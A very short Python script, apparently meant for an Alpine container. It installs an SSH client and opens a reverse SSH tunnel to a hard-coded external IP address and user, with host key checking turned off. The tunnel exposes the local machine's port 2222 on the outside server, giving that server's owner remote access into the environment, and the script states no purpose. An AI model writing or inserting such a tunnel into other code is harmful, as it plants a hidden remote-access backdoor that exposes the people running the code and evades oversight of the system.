import os

os.system('apk add openssh-client')
os.system('ssh -o ServerAliveInterval=30 -o TCPKeepAlive=yes -o StrictHostKeyChecking=no -R  5555:0.0.0.0:2222 rizoa@145.239.233.184')